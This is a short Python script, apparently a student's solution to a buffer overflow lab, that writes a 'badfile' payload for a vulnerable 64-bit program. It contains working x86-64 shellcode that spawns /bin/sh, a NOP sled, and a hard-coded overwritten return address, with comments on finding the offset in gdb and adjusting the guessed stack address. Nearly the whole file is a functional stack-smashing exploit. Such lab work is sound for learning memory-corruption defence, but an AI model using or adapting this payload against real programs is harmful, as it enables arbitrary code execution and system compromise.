#!/usr/bin/python3
import sys

# use gdb on stack-L3-dbg to find the return address, it contains zeroes (64bit, two leading zeroes). 
# Because the zeroes in the address will terminate the the strcpy so the shellcode cannot be put  at the end. 
# Instead, the shellcode needs to be put before the return address.

badfilesize = 517
# Replace the content with the actual shellcode
# You may copy it from ../shellcode/call_shellcode.c
# len(32bit shellcode)=27; len(64bit shellcode)=30
shellcode64= (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05" 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(badfilesize)) 

##################################################################
# Put the shellcode64 at the end of the buffer
start = badfilesize - len(shellcode64)
content[start:] = shellcode64

# From gdb: 
# $rbp = 0x7fffffffd910
# &buffer = 0x7fffffffd906 
# $rbp - &buffer = 10 too small to hold the shellcode
# After buffer overflow, the shellcode is in the main function’s stack frame, not in bof. 
# so the return address needs to be set to the main function’s stack frame. 
# Check the source code, there is a dummy stack frame between bof and main, and its size is about(due to alignment) 1000 bytes. 
# so we will add 1500 to the buffer address (500 is to compensate the difference caused by gdb).
#  (check details with IDA Pro)

# $rbp - &buffer = 10
offset = 10 + 8

ret    = 0x7fffffffd906 + 1650 #220,400 choose another compensate number if not work


L = 8     
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
